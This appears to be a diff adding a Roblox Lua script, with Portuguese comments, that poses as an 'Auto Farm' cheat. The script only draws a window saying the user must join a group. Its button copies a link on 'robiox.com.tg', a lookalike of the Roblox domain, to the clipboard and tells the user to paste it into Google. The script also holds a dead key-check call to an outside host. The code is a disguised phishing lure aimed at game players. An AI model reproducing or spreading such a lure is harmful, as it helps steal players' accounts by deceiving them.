@@ -1,0 +1,129 @@
+local function createWindow(buttonFunction)
+    -- Função para criar elementos UI
+    local function createUIElement(className, properties)
+        local element = Instance.new(className)
+        for property, value in pairs(properties) do
+            element[property] = value
+        end
+        return element
+    end
+
+    -- Crie uma ScreenGui
+    local screenGui = createUIElement("ScreenGui", {Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")})
+
+    -- Crie um Frame para ser a janela principal
+    local frame = createUIElement("Frame", {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = Color3.fromRGB(20, 20, 60),
+        BorderSizePixel = 1,
+        BorderColor3 = Color3.fromRGB(30, 30, 90),
+        Parent = screenGui
+    })
+
+    -- Arredondar as bordas do frame principal
+    local frameCorner = createUIElement("UICorner", {CornerRadius = UDim.new(0, 15), Parent = frame})
+
+    -- Título da janela
+    local title = createUIElement("TextLabel", {
+        Size = UDim2.new(1, 0, 0.2, 0),
+        Position = UDim2.new(0, 0, 0, 0),
+        Text = "Auto Farm", -- Modificado para o novo título
+        TextColor3 = Color3.new(1, 1, 1),
+        BackgroundTransparency = 1,
+        TextScaled = true,
+        Parent = frame
+    })
+
+    -- Subtítulo da janela
+    local subtitle = createUIElement("TextLabel", {
+        Size = UDim2.new(1, 0, 0.2, 0),
+        Position = UDim2.new(0, 0, 0.7, 0),
+        Text = "join our group to access the script",
+        TextColor3 = Color3.new(1, 1, 1),
+        BackgroundTransparency = 1,
+        TextScaled = true,
+        Parent = frame
+    })
+
+    -- Crie um botão dentro da janela
+    local button = createUIElement("TextButton", {
+        Size = UDim2.new(0.6, 0, 0.2, 0),
+        Position = UDim2.new(0.2, 0, 0.4, 0),
+        Text = "Clique aqui",
+        BackgroundColor3 = Color3.fromRGB(0, 120, 255),
+        TextColor3 = Color3.new(1, 1, 1),
+        Parent = frame
+    })
+
+    -- Arredondar as bordas do botão
+    local buttonCorner = createUIElement("UICorner", {CornerRadius = UDim.new(0, 10), Parent = button})
+
+    -- Mini janela de aviso (inicialmente invisível)
+    local warningFrame = createUIElement("Frame", {
+        Size = UDim2.new(0.4, 0, 0.1, 0),
+        Position = UDim2.new(0.5, 0, 0.85, 0),
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = Color3.fromRGB(0, 255, 255), -- Fundo ciano
+        Visible = false, -- Oculta a mini janela inicialmente
+        Parent = screenGui
+    })
+
+    -- Arredondar as bordas do aviso
+    local warningCorner = createUIElement("UICorner", {CornerRadius = UDim.new(0, 10), Parent = warningFrame})
+
+    -- Texto do aviso
+    local warningText = createUIElement("TextLabel", {
+        Size = UDim2.new(1, 0, 1, 0),
+        Position = UDim2.new(0, 0, 0, 0),
+        Text = "Cole o link no Google",
+        TextColor3 = Color3.new(0, 0, 0), -- Texto preto
+        BackgroundTransparency = 1,
+        TextScaled = true,
+        Parent = warningFrame
+    })
+
+    -- Serviço de animação
+    local TweenService = game:GetService("TweenService")
+
+    -- Função para animar a cor do botão
+    local function animateButtonClick()
+        button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        wait(1)
+        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local goal = {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}
+        local tween = TweenService:Create(button, tweenInfo, goal)
+        tween:Play()
+    end
+
+    -- Evento de clique do botão
+    button.MouseButton1Click:Connect(function()
+        -- Copia o link para o clipboard
+        setclipboard("https://www.robiox.com.tg/communities/166332911518/Maru-Hub")
+
+        local key = "your key"
+
+        pcall(function()
+            if key == game:HttpGet("https://keysystem.ml/verify/your_app_name?verify_key="..key) then
+                print("Good")
+            end
+        end)
+
+        -- Torna a mini janela de aviso visível
+        warningFrame.Visible = true
+
+        -- Animação do clique do botão
+        animateButtonClick()
+    end)
+
+    -- Animação de abertura da janela principal
+    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local sizeGoal = {Size = UDim2.new(0.3, 0, 0.3, 0)}
+    local openTween = TweenService:Create(frame, tweenInfo, sizeGoal)
+    openTween:Play()
+end
+
+-- Atraso de 2 segundos antes de criar a janela
+wait(2)
+createWindow()
